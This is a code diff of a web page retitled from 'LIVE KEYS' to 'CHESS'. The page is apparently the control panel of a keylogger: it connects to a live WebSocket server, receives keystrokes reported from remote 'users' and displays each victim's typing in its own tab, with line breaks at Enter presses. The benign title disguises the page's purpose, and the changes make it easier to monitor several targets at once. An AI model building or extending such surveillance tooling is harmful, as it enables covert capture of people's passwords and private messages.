@@ -1,241 +1,410 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>LIVE KEYS</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            background-color: #1B1C1D;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            min-height: 100vh;
-            margin: 0;
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-            padding: 50px 15px;
-            box-sizing: border-box;
-        }
-        h1 {
-            color: #0000FF;
-            font-size: 50px;
-            margin: 0;
-        }
-        #status-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 15px;
-            font-size: 18px;
-            font-weight: bold;
-            margin-top: 8px;
-            margin-bottom: 10px;
-            color: #FFFFFF;
-            height: 36px;
-        }
-        .rectangle {
-            width: 1000px;
-            max-width: 95%;
-            height: 500px;
-            background-color: transparent;
-            border: 3px solid white;
-            border-radius: 25px;
-            margin-top: 20px;
-            padding: 15px;
-            overflow-y: auto;
-            box-sizing: border-box;
-        }
-        .rectangle p {
-            color: white;
-            margin: 5px 0;
-            font-size: 16px;
-            word-wrap: break-word;
-        }
-        #plus-btn {
-            display: none;
-            margin-left: 10px;
-            padding: 5px 10px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            border-radius: 50%;
-            width: 32px;
-            height: 32px;
-            border: 1px solid white;
-            background-color: #333;
-            color: white;
-            line-height: 1;
-        }
-        #other-users-container {
-            display: none;
-            margin-top: 15px;
-            border-top: 1px solid #555;
-            padding-top: 15px;
-            width: 90%;
-            max-width: 500px;
-        }
-        #other-users-list {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-            color: white;
-        }
-        #other-users-list li {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 8px;
-            padding: 8px;
-            background-color: #2a2c2d;
-            border-radius: 5px;
-        }
-        #other-users-list li button, .rename-btn {
-            margin-left: 15px;
-            cursor: pointer;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CHESS</title>
+  <style>
+    :root {
+      --bg: #1b1c1d;
+      --fg: #ffffff;
+      --muted: #999;
+      --border: #555;
+      --panel: #2a2c2d;
+      --tab: #333;
+      --accent: #0000ff;
+    }
+
+    * { box-sizing: border-box; }
+    html, body { height: 100%; }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--fg);
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 50px 15px;
+      gap: 18px;
+    }
+
+    h1 {
+      color: var(--accent);
+      margin: 0;
+      font-size: 50px;
+      letter-spacing: 0.5px;
+    }
+
+    /* Status Bar */
+    #status-container {
+      width: 1000px;
+      max-width: 95%;
+      min-height: 40px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 600;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 8px 12px;
+      background: rgba(255,255,255,0.02);
+    }
+    #status-container .spacer { flex: 1; }
+
+    #plus-btn {
+      margin-left: 8px;
+      padding: 6px 10px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      border-radius: 999px;
+      border: 1px solid var(--fg);
+      background: var(--tab);
+      color: var(--fg);
+      line-height: 1;
+    }
+
+    #rename-btn {
+      padding: 6px 12px;
+      font-size: 14px;
+      font-weight: 600;
+      border: 1px solid var(--fg);
+      color: var(--fg);
+      background: transparent;
+      border-radius: 999px;
+      cursor: pointer;
+    }
+
+    #other-users-container {
+      display: none;
+      width: 1000px;
+      max-width: 95%;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 12px;
+      background: var(--panel);
+    }
+    #other-users-list { list-style: none; margin: 0; padding: 0; }
+    #other-users-list li {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 8px 10px;
+      margin: 6px 0;
+      background: rgba(255,255,255,0.03);
+      border-radius: 8px;
+      color: var(--fg);
+      font-size: 14px;
+    }
+
+    /* Tabs */
+    #user-tabs-container {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      width: 1000px;
+      max-width: 95%;
+      margin-top: 4px;
+    }
+    .tab {
+      padding: 10px 14px;
+      background: var(--tab);
+      color: var(--fg);
+      border: 1px solid var(--border);
+      border-bottom: none;
+      border-radius: 10px 10px 0 0;
+      cursor: pointer;
+      user-select: none;
+      font-weight: 600;
+      opacity: 0.8;
+      transition: opacity 120ms ease;
+    }
+    .tab:hover { opacity: 1; }
+    .tab.active {
+      background: var(--bg);
+      border-color: var(--fg);
+      border-bottom: 1px solid var(--bg);
+      position: relative; top: 1px;
+      opacity: 1;
+    }
+
+    /* Message area */
+    #message-box {
+      width: 1000px;
+      max-width: 95%;
+      height: 500px;
+      border: 3px solid var(--fg);
+      border-radius: 25px;
+      padding: 16px;
+      overflow: hidden; /* container scroll hidden; inner panes scroll */
+      background: transparent;
+    }
+
+    .key-display {
+      display: none;
+      height: 100%;
+      overflow-y: auto;
+      padding-right: 8px;
+    }
+    .key-display.active { display: block; }
+
+    .key-display p {
+      margin: 6px 0;
+      font-size: 16px;
+      word-wrap: break-word;
+      white-space: pre-wrap;
+    }
+
+    .muted { color: var(--muted); }
+    .danger { color: #e74c3c; }
+  </style>
 </head>
 <body>
+  <h1>CHESS</h1>
 
-    <h1>CHESS</h1>
-    
-    <div id="status-container"></div>
-    
-    <div id="other-users-container">
-        <ul id="other-users-list"></ul>
-    </div>
+  <!-- Status (selected user + X others) and Rename (targets selected tab user) -->
+  <div id="status-container"></div>
+  <div id="other-users-container">
+    <ul id="other-users-list"></ul>
+  </div>
 
-    <div id="message-box" class="rectangle"></div>
+  <!-- Tabs (switch selected user view) -->
+  <div id="user-tabs-container"></div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            // Use ws:// for local testing, wss:// for production
-            const ws = new WebSocket("wss://NZE77-coke.hf.space/ws"); 
+  <!-- Per-user key streams -->
+  <div id="message-box"></div>
 
-            const statusContainer = document.getElementById('status-container');
-            const messageBox = document.getElementById('message-box');
-            const otherUsersContainer = document.getElementById('other-users-container');
-            const otherUsersListEl = document.getElementById('other-users-list');
+  <script>
+    (function () {
+      const WS_URL = "wss://NZE77-coke.hf.space/ws";
 
-            let activeUsers = [];
-            let currentLineElement = null;
+      // DOM refs
+      const statusContainer = document.getElementById('status-container');
+      const otherUsersContainer = document.getElementById('other-users-container');
+      const otherUsersListEl = document.getElementById('other-users-list');
+      const userTabsContainer = document.getElementById('user-tabs-container');
+      const messageBox = document.getElementById('message-box');
 
-            function createRenameButton(user) {
-                const renameBtn = document.createElement('button');
-                renameBtn.textContent = 'Rename';
-                renameBtn.className = 'rename-btn';
-                renameBtn.onclick = () => {
-                    const newName = prompt(`Enter new name for "${user.name}":`, user.name);
-                    if (newName && newName.trim() !== '') {
-                        ws.send(JSON.stringify({
-                            type: 'rename_request',
-                            id: user.id,
-                            newName: newName.trim()
-                        }));
-                    }
-                };
-                return renameBtn;
-            }
+      // State
+      let ws = null;
+      let activeUsers = [];              // [{id, name}, ...]
+      let selectedUserId = null;         // currently viewed user id
+      const userLineEls = new Map();     // userId -> current <p> element
 
-            function renderUserList() {
-                statusContainer.innerHTML = '';
-                otherUsersListEl.innerHTML = '';
-                otherUsersContainer.style.display = 'none';
+      // --- WebSocket ---
+      function connect() {
+        ws = new WebSocket(WS_URL);
 
-                if (activeUsers.length === 0) {
-                    statusContainer.textContent = '0 Users Sending Keys';
-                    // Hide plus button if it exists
-                    const plusBtn = statusContainer.querySelector('#plus-btn');
-                    if(plusBtn) plusBtn.style.display = 'none';
+        ws.onopen = () => {
+          setStatusText('Connecting...');
+          safeSend({ type: 'identify_viewer' });
+        };
 
-                } else if (activeUsers.length === 1) {
-                    const singleUser = activeUsers[0];
-                    const nameSpan = document.createElement('span');
-                    nameSpan.textContent = `${singleUser.name} connected`;
-                    statusContainer.appendChild(nameSpan);
-                    statusContainer.appendChild(createRenameButton(singleUser));
+        ws.onmessage = (event) => {
+          let msg;
+          try { msg = JSON.parse(event.data); } catch { return; }
+          switch (msg.type) {
+            case 'user_list_update':
+              handleUserListUpdate(msg.users || []);
+              break;
+            case 'key_press':
+              handleKeyPress(msg);
+              break;
+            default:
+              console.warn('Unknown message type:', msg.type);
+          }
+        };
 
-                } else { // 2 or more users
-                    const firstUser = activeUsers[0];
-                    const otherUsers = activeUsers.slice(1);
-                    const nameSpan = document.createElement('span');
-                    nameSpan.textContent = `${firstUser.name} connected`;
-                    statusContainer.appendChild(nameSpan);
-                    statusContainer.appendChild(createRenameButton(firstUser));
+        ws.onclose = () => {
+          setStatusText('Disconnected. Refresh to reconnect.', true);
+        };
 
-                    const plusBtn = document.createElement('button');
-                    plusBtn.id = 'plus-btn';
-                    plusBtn.textContent = `+${otherUsers.length}`;
-                    plusBtn.onclick = () => {
-                        const isHidden = otherUsersContainer.style.display === 'none';
-                        otherUsersContainer.style.display = isHidden ? 'block' : 'none';
-                    };
-                    statusContainer.appendChild(plusBtn);
+        ws.onerror = (err) => {
+          console.error('WebSocket error:', err);
+          setStatusText('Connection Error.', true);
+        };
+      }
 
-                    otherUsers.forEach(user => {
-                        const li = document.createElement('li');
-                        const nameSpan = document.createElement('span');
-                        nameSpan.textContent = user.name;
-                        li.appendChild(nameSpan);
-                        li.appendChild(createRenameButton(user));
-                        otherUsersListEl.appendChild(li);
-                    });
-                }
-            }
+      function safeSend(payload) {
+        try { ws && ws.readyState === 1 && ws.send(JSON.stringify(payload)); } catch {}
+      }
 
-            function handleKeyPress(data) {
-                if (data.includes("[ENTER]")) {
-                    currentLineElement = null;
-                    return;
-                }
-                if (currentLineElement === null) {
-                    currentLineElement = document.createElement('p');
-                    messageBox.prepend(currentLineElement);
-                }
-                currentLineElement.textContent += data;
-            }
+      // --- Render helpers ---
+      function setStatusText(text, danger = false) {
+        statusContainer.textContent = text;
+        statusContainer.classList.toggle('danger', !!danger);
+      }
 
-            ws.onopen = () => {
-                statusContainer.textContent = "Connecting...";
-                ws.send(JSON.stringify({ type: "identify_viewer" }));
-            };
+      function handleUserListUpdate(users) {
+        const existingIds = new Set(users.map(u => u.id));
+        if (!selectedUserId || !existingIds.has(selectedUserId)) {
+          selectedUserId = users.length ? users[0].id : null;
+        }
 
-            ws.onmessage = (event) => {
-                const message = JSON.parse(event.data);
-                
-                // --- DEBUGGING LINE ---
-                // This will show every message received from the server in your browser's console.
-                console.log("Received message from server:", message);
-                // --- END DEBUGGING LINE ---
-
-                switch (message.type) {
-                    case 'user_list_update':
-                        activeUsers = message.users;
-                        renderUserList();
-                        break;
-                    case 'key_press':
-                        handleKeyPress(message.data);
-                        break;
-                    default:
-                        console.warn('Received unknown message type:', message.type);
-                }
-            };
-
-            ws.onclose = () => {
-                statusContainer.textContent = 'Disconnected. Refresh to reconnect.';
-                statusContainer.style.color = '#E74C3C';
-            };
-
-            ws.onerror = (error) => {
-                statusContainer.textContent = 'Connection Error.';
-                statusContainer.style.color = '#E74C3C';
-                console.error("WebSocket Error:", error);
-            };
+        const existingDisplays = Array.from(messageBox.querySelectorAll('.key-display'));
+        existingDisplays.forEach(div => {
+          const uid = div.dataset.userId;
+          if (uid && !existingIds.has(uid)) {
+            div.remove();
+            userLineEls.delete(uid);
+          }
         });
-    </script>
 
+        activeUsers = users.slice();
+        renderAll();
+      }
+
+      function renderAll() {
+        renderStatusAndOtherUsers();
+        renderTabs();
+        renderDisplays();
+      }
+
+      // Status: show selected user + X others, Rename applies to selected tab user
+      function renderStatusAndOtherUsers() {
+        statusContainer.innerHTML = '';
+        otherUsersListEl.innerHTML = '';
+        otherUsersContainer.style.display = 'none';
+
+        if (activeUsers.length === 0) {
+          const span = document.createElement('span');
+          span.textContent = '0 Users connected';
+          span.className = 'muted';
+          statusContainer.appendChild(span);
+          return;
+        }
+
+        const selected = activeUsers.find(u => u.id === selectedUserId);
+        const others = activeUsers.filter(u => u.id !== selectedUserId);
+
+        const nameSpan = document.createElement('span');
+        nameSpan.textContent = `${selected.name} connected`;
+        statusContainer.appendChild(nameSpan);
+
+        const renameBtn = document.createElement('button');
+        renameBtn.id = 'rename-btn';
+        renameBtn.textContent = 'Rename';
+        renameBtn.addEventListener('click', () => onRenameSelected(selected));
+        statusContainer.appendChild(renameBtn);
+
+        if (others.length > 0) {
+          const plusBtn = document.createElement('button');
+          plusBtn.id = 'plus-btn';
+          plusBtn.textContent = `+${others.length}`;
+          plusBtn.addEventListener('click', () => {
+            const hidden = otherUsersContainer.style.display === 'none';
+            otherUsersContainer.style.display = hidden ? 'block' : 'none';
+          });
+          statusContainer.appendChild(plusBtn);
+
+          others.forEach(u => {
+            const li = document.createElement('li');
+            const span = document.createElement('span');
+            span.textContent = u.name;
+            li.appendChild(span);
+            otherUsersListEl.appendChild(li);
+          });
+        }
+
+        const spacer = document.createElement('div');
+        spacer.className = 'spacer';
+        statusContainer.appendChild(spacer);
+        const hint = document.createElement('span');
+        hint.className = 'muted';
+        hint.textContent = ws && ws.readyState === 1 ? 'Live' : 'Idle';
+        statusContainer.appendChild(hint);
+      }
+
+      function onRenameSelected(user) {
+        const newName = prompt(`Enter new name for "${user.name}":`, user.name);
+        if (!newName) return;
+        const trimmed = newName.trim();
+        if (!trimmed || trimmed === user.name) return;
+        safeSend({ type: 'rename_request', id: user.id, newName: trimmed });
+      }
+
+      function renderTabs() {
+        userTabsContainer.innerHTML = '';
+        activeUsers.forEach(u => {
+          const tab = document.createElement('div');
+          tab.className = 'tab' + (u.id === selectedUserId ? ' active' : '');
+          tab.textContent = u.name;
+          tab.dataset.userId = u.id;
+          tab.addEventListener('click', () => {
+            if (selectedUserId !== u.id) {
+              selectedUserId = u.id;
+              renderAll();
+            }
+          });
+          userTabsContainer.appendChild(tab);
+        });
+      }
+
+      function ensureDisplay(userId) {
+        let display = messageBox.querySelector(`.key-display[data-user-id="${userId}"]`);
+        if (!display) {
+          display = document.createElement('div');
+          display.className = 'key-display';
+          display.dataset.userId = userId;
+          messageBox.appendChild(display);
+        }
+        return display;
+      }
+
+      function renderDisplays() {
+        const ids = new Set(activeUsers.map(u => u.id));
+
+        activeUsers.forEach(u => {
+          const display = ensureDisplay(u.id);
+          display.classList.toggle('active', u.id === selectedUserId);
+        });
+
+        const displays = Array.from(messageBox.querySelectorAll('.key-display'));
+        displays.forEach(d => {
+          if (!ids.has(d.dataset.userId)) d.remove();
+        });
+      }
+
+      // --- Key press handling ---
+      function handleKeyPress(message) {
+        const userId = message.from_user_id;
+        const data = String(message.data ?? '');
+
+        if (!activeUsers.some(u => u.id === userId)) return;
+
+        const display = ensureDisplay(userId);
+
+        if (!userLineEls.has(userId)) {
+          userLineEls.set(userId, null);
+        }
+
+        const parts = data.split(/\[ENTER\]/g);
+        for (let i = 0; i < parts.length; i++) {
+          const chunk = parts[i];
+          if (chunk) {
+            let line = userLineEls.get(userId);
+            if (!line) {
+              line = document.createElement('p');
+              display.prepend(line);
+              userLineEls.set(userId, line);
+            }
+            line.textContent += chunk;
+          }
+          if (i < parts.length - 1) {
+            userLineEls.set(userId, null);
+          }
+        }
+
+        if (userId === selectedUserId) {
+          display.scrollTop = 0;
+        }
+      }
+
+      // Init
+      connect();
+    })();
+  </script>
 </body>
-
 </html>
-
